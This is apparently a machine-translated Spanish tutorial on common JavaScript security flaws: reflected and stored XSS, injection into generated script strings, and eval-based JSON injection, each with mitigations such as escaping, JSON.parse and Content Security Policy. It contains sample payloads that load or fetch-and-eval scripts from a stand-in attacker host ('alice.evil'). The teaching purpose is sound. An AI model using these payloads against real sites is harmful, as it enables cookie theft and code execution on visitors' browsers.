Esta es una colección de problemas comunes de seguridad de JavaScript, como XSS e inyección de evaluación. Esta colección también contiene cómo mitigar estos problemas de seguridad.

Secuencias de comandos entre sitios reflejadas (XSS) #

Digamos que Joe tiene un sitio web que le permite iniciar sesión, ver videos de cachorros y guardarlos en su cuenta.

Cada vez que un usuario busca en ese sitio web, se le redirige a https://example.com/search?q=brown+puppies.

Si la búsqueda de un usuario no coincide con nada, verá un mensaje como:

Tu búsqueda (cachorros marrones), no coincide con nada. Intentar otra vez.

En el backend, ese mensaje se muestra así:

if(!searchResults){
    webPage += "<div>Your search (<b>" + searchQuery + "</b>), didn't match anything. Try again.";
}

Sin embargo, cuando Alice busca <h1>títulos</h1>, obtiene esto de vuelta:

Tu búsqueda (

títulos

) no coincide con nada. Intentar otra vez.

HTML sin procesar:

Your search (<b><h1>headings</h1></b>) didn't match anything. Try again.

Cuando Alice busca <script>alert(1)</script>, ve:

Tu búsqueda (), no coincidió con nada. Intentar otra vez.

Y:

Luego, Alice busca <script src = "https://alice.evil/puppy_xss.js></script>cachorros realmente lindos, copia el enlace en su barra de direcciones y envía un correo electrónico a Bob:

boba,

Cuando busco cachorros lindos, ¡no pasa nada!

Entonces Alice logra que Bob ejecute su script con éxito mientras Bob está conectado a su cuenta.

Mitigación: #

  1. Salga de todos los corchetes angulares en las búsquedas antes de devolver el término de búsqueda cuando no se encuentren resultados.
  2. No devuelva el término de búsqueda cuando no se encuentren resultados.
  3. Agregue una Política de seguridad de contenido que se niega a cargar contenido activo de otros dominios

Scripts persistentes entre sitios (XSS) #

Digamos que Bob posee un sitio web social que permite a los usuarios personalizar sus perfiles.

Alice va al sitio web de Bob, crea una cuenta y va a la configuración de su perfil. Establece la descripción de su perfil en “De hecho, soy demasiado vago para escribir algo aquí”.

Cuando sus amigos ven su perfil, este código se ejecuta en el servidor:

if(viewedPerson.profile.description){
    page += "<div>" + viewedPerson.profile.description + "</div>";
}else{
    page += "<div>This person doesn't have a profile description.</div>";
}

Resultando en este HTML:

<div>I'm actually too lazy to write something here.</div>

Than Alice establece la descripción de su perfil en <b>Me gusta HTML</b>. Cuando visita su perfil, en lugar de ver

<b>Me gusta HTML</b>

ella ve

Me gusta HTML

Luego, Alice establece su perfil en

<script src = "https://alice.evil/profile_xss.js"></script>I'm actually too lazy to write something here.

Cada vez que alguien visita su perfil, ejecuta el script de Alice en el sitio web de Bob mientras está conectado a su cuenta.

Mitigación #

  1. Soportes angulares de escape en descripciones de perfiles, etc.
  2. Almacene las descripciones de perfil en un archivo de texto sin formato que luego se obtiene con un script que agrega la descripción a través de .innerText
  3. Agregue una Política de seguridad de contenido que se niega a cargar contenido activo de otros dominios

Scripts persistentes entre sitios a partir de literales de cadenas de JavaScript #

Digamos que Bob tiene un sitio que le permite publicar mensajes públicos.

Los mensajes son cargados por un script que se ve así:

addMessage("Message 1");
addMessage("Message 2");
addMessage("Message 3");
addMessage("Message 4");
addMessage("Message 5");
addMessage("Message 6");

La función addMessage agrega un mensaje publicado al DOM. Sin embargo, en un esfuerzo por evitar XSS, cualquier código HTML en los mensajes publicados se escapa.

El script se genera en el servidor así:

for(var i = 0; i < messages.length; i++){
    script += "addMessage(\"" + messages[i] + "\");";
}

Así que Alice publica un mensaje que dice: Mi mamá dijo: "La vida es buena. La tarta la hace mejor".. Entonces, cuando ve una vista previa del mensaje, en lugar de ver su mensaje, ve un error en la consola:

Uncaught SyntaxError: missing ) after argument list

¿Por qué? Porque el script generado se ve así:

addMessage("My mom said: "Life is good. Pie makes it better. "");

Eso es un error de sintaxis. Que Alice publica:

I like pie ");fetch("https://alice.evil/js_xss.js").then(x=>x.text()).then(eval);//

Entonces el script generado se parece a:

addMessage("I like pie ");fetch("https://alice.evil/js_xss.js").then(x=>x.text()).then(eval);//");

Eso agrega el mensaje Me gusta el pastel, pero también descarga y ejecuta https://alice.evil/js_xss.js cada vez que alguien visita el sitio de Bob.

Mitigación: #

  1. Pase el mensaje publicado a [JSON.stringify()](https://www.wikiod.com/es/javascript/json#Serializar un valor)
  2. En lugar de crear dinámicamente una secuencia de comandos, cree un archivo de texto sin formato que contenga todos los mensajes que luego la secuencia de comandos obtiene.
  3. Agregue una Política de seguridad de contenido que se niega a cargar contenido activo de otros dominios

Por qué los scripts de otras personas pueden dañar su sitio web y sus visitantes #

Si no cree que los scripts maliciosos pueden dañar su sitio, está equivocado. Aquí hay una lista de lo que podría hacer un script malicioso:

  1. Eliminarse del DOM para que no pueda ser rastreado
  2. Roba las cookies de sesión de los usuarios y permite que el autor del script inicie sesión y se haga pasar por ellos
  3. Mostrar un mensaje falso “Su sesión ha expirado. Vuelva a iniciar sesión”. mensaje que envía la contraseña del usuario al autor del script.
  4. Registre un trabajador de servicio malicioso que ejecute un script malicioso en cada visita de página a ese sitio web.
  5. Instale un muro de pago falso que exija que los usuarios paguen dinero para acceder al sitio que en realidad va al autor del guión.

Por favor, no crea que XSS no dañará su sitio web y sus visitantes.

Inyección JSON evaluada #

Digamos que cada vez que alguien visita una página de perfil en el sitio web de Bob, se obtiene la siguiente URL:

https://example.com/api/users/1234/profiledata.json

Con una respuesta como esta:

{
    "name": "Bob",
    "description": "Likes pie & security holes."
}

Que esos datos se analizan e insertan:

var data = eval("(" + resp + ")");
document.getElementById("#name").innerText = data.name;
document.getElementById("#description").innerText = data.description;

Parece bueno, ¿verdad? Equivocado.

¿Qué pasa si la descripción de alguien es Le gusta XSS."});alert(1);({"name":"Alice","description":"Le gusta XSS.? Parece extraño, pero si se hace mal, la respuesta será :

{
    "name": "Alice",
    "description": "Likes pie & security holes."});alert(1);({"name":"Alice","description":"Likes XSS."
}

Y esto será evaluado:

({
    "name": "Alice",
    "description": "Likes pie & security holes."});alert(1);({"name":"Alice","description":"Likes XSS."
})

Si no cree que eso sea un problema, péguelo en su consola y vea qué sucede.

Mitigación #

  • Use JSON.parse en lugar de eval para obtener JSON. En general, no use eval, y definitivamente no use eval con algo que un usuario pueda controlar. Eval crea un nuevo contexto de ejecución, creando un golpe de rendimiento.

  • Escapa correctamente " y \ en los datos del usuario antes de ponerlos en JSON. Si simplemente escapas de ", entonces sucederá lo siguiente:

     Hello! \"});alert(1);({

Se convertirá en:

   "Hello! \\"});alert(1);({"
Oops. Remember to escape both the `\` and `"`, or just use JSON.parse.
